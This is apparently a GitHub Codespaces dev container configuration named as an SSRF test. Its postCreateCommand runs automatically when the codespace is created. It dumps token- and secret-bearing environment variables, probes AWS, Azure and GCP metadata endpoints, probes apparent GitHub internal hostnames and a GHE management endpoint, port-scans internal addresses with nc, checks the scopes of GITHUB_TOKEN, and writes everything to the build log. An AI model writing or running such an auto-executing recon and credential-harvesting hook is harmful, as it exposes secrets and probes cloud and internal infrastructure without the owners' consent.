name: SSRF Comprehensive Test
postCreateCommand: bash -c 'exec > /tmp/ssrf-results.txt 2>&1; echo "=== CODESPACE SSRF RECON $(date) ==="; echo ""; echo "=== 1. ENVIRONMENT TOKENS ==="; env | grep -iE "(GITHUB|TOKEN|SECRET|KEY|CODESPACE|AZURE|GH_)" | sort; echo ""; echo "=== 2. IMDS PROBES ==="; echo "AWS:"; curl -s -m 3 http://169.254.169.254/latest/meta-data/; echo ""; echo "Azure:"; curl -s -m 3 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"; echo ""; echo "GCP:"; curl -s -m 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/; echo ""; echo "=== 3. GITHUB INTERNAL DNS ==="; for h in ghe.io github.localhost api.github.localhost ghcr.io actions-runner-controller.github.internal github-actions.github.internal; do echo -n "$h: "; getent hosts $h 2>/dev/null || dig +short $h 2>/dev/null || echo "NXDOMAIN"; done; echo ""; echo "=== 4. GHE.IO PROBE ==="; curl -sv -m 5 http://ghe.io:8443/manage/v1/config/init 2>&1 | head -30; curl -sv -m 5 https://ghe.io:8443/manage/v1/config/init 2>&1 | head -30; echo ""; echo "=== 5. INTERNAL NETWORK SCAN ==="; for target in 10.0.0.1 172.17.0.1 172.16.0.1 192.168.0.1 host.docker.internal kubernetes.default.svc; do echo -n "$target: "; timeout 2 nc -zv $target 80 2>&1 || echo "closed"; done; echo ""; echo "=== 6. CODESPACE SECRETS API ==="; if [ -n "$GITHUB_TOKEN" ]; then echo "Token scopes:"; curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user | grep -i x-oauth-scopes; fi; cat /tmp/ssrf-results.txt'
